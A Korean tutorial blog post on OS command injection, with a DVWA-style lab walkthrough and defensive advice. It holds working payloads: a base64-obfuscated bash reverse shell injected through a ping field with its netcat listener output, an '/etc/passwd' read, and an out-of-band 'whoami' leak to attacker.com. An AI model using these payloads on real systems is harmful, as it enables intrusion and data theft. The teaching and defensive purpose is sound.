---
layout: post
title: "Command Injection"
date: 2025-09-03 17:00:00 +0900
categories: [web-hacking]
---

## 1. 개요

**Command Injection**은 웹 애플리케이션이 사용자 입력을 적절한 검증 없이 시스템 쉘(Shell)에 전달할 때 발생하는 취약점이다.
공격자는 이를 통해 웹 서버의 운영체제(OS) 명령어를 실행할 수 있으며, 시스템 권한을 탈취하거나 민감한 파일을 열람하는 등 심각한 피해를 입힐 수 있다.

### 발생 원인
개발자가 `system()`, `exec()`, `passthru()`와 같은 함수를 사용하여 외부 명령어(예: ping, nslookup)를 호출할 때, 사용자 입력값을 직접 연결(Concatenation)하여 사용할 경우 발생한다.

---

## 2. 공격 메커니즘

운영체제 쉘에서 여러 명령어를 한 번에 실행하기 위해 사용하는 **메타 문자**를 악용한다.

*   **`;` (세미콜론)**: 앞 명령어의 성공 여부와 상관없이 다음 명령어를 실행한다. (Unix/Linux)
    *   입력값: `127.0.0.1; cat /etc/passwd`
    *   실행됨: `ping 127.0.0.1` 실행 후 `cat /etc/passwd` 실행
*   **`&&` (AND 연산자)**: 앞 명령어가 성공했을 때만 다음 명령어를 실행한다.
*   **`|` (파이프)**: 앞 명령어의 출력을 뒤 명령어의 입력으로 전달한다.
*   **`$()` 또는 `` ` `` (Backtick)**: 명령어 실행 결과를 문자열로 치환한다.

---

## 3. 공격 실습: Base64 우회

웹 방화벽이나 애플리케이션 필터링으로 인해 `cat`, `ls`, `bash` 같은 특정 키워드가 차단된 경우, 명령어를 **Base64로 인코딩**하여 우회하는 기법이다.

### 1단계: 리버스 쉘 페이로드 인코딩
공격자는 자신의 로컬 머신에서 실행하고자 하는 명령어를 Base64로 인코딩한다.
```bash
# 원본 명령: bash 리버스 쉘
$ echo "bash -i >& /dev/tcp/192.9.200.12/4444 0>&1" | base64 -w0

# 결과
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuOS4yMDAuMTIvNDQ0NCAwPiYx
```

### 2단계: 리스너 대기 (공격자 서버)
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
```

### 3단계: 페이로드 주입 (웹 애플리케이션)
취약한 입력 필드(예: IP 주소 입력란)에 다음과 같이 주입한다. 서버에서 디코딩 후 실행되도록 파이프라인을 구성한다.
```text
127.0.0.1; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuOS4yMDAuMTIvNDQ0NCAwPiYx | base64 -d | bash
```
*   `echo ...`: 인코딩된 문자열 출력
*   `base64 -d`: 원본 명령어로 디코딩
*   `bash`: 디코딩된 명령어(리버스 쉘) 실행

### 4단계: 공격 성공 확인
서버가 디코딩된 명령을 실행하면 공격자의 리스너에 쉘이 연결된다.
```bash
connect to [192.9.200.12] from (UNKNOWN) [192.9.200.11] 38912
www-data@dvwa:/var/www/html$ whoami
www-data
www-data
```

---

## 4. Blind Injection

명령어 실행 결과가 화면에 출력되지 않는 경우, **시간 지연(Time-based)**이나 **외부 통신(Out-of-Band)**을 통해 실행 여부를 확인한다.

### Time-based (시간 지연)
`sleep` 명령어를 사용하여 서버의 응답이 지연되는지 확인한다. 응답이 늦게 오면 명령어가 성공한 것이다.
```bash
# 5초간 대기 (성공 시 응답 지연 발생)
127.0.0.1; sleep 5
```

### OOB (Out-of-Band)
결과를 공격자가 제어하는 외부 서버로 전송한다. `ping`, `wget`, `curl` 등을 사용한다.
```bash
# DNS 쿼리를 이용한 데이터 유출 (Burp Collaborator 활용)
# `whoami` 결과를 서브도메인으로 포함시켜 전송
127.0.0.1; ping -c 1 $(whoami).attacker.com
```

---

## 5. 보안 대책

*   **입력값 검증 (Input Validation)**: `;`, `&`, `|`, `` ` `` 등 쉘 메타 문자가 입력값에 포함되지 않도록 **화이트리스트** 방식으로 엄격하게 검증한다. (예: 숫자와 점(.)만 허용)
*   **안전한 API 사용**: `system()` 같은 쉘 호출 함수 대신, 각 언어에서 제공하는 라이브러리나 API를 사용한다. (예: Python의 `subprocess.run` 사용 시 `shell=False` 옵션 권장)
*   **최소 권한 원칙**: 웹 애플리케이션 프로세스를 root가 아닌 낮은 권한의 계정(`www-data` 등)으로 실행하여, 쉘이 탈취되더라도 피해 범위를 제한한다.
*   **파라미터화 된 함수 사용**: `execve()`와 같이 명령어와 인자를 명확히 분리하여 전달하는 함수를 사용한다.

<hr class="short-rule">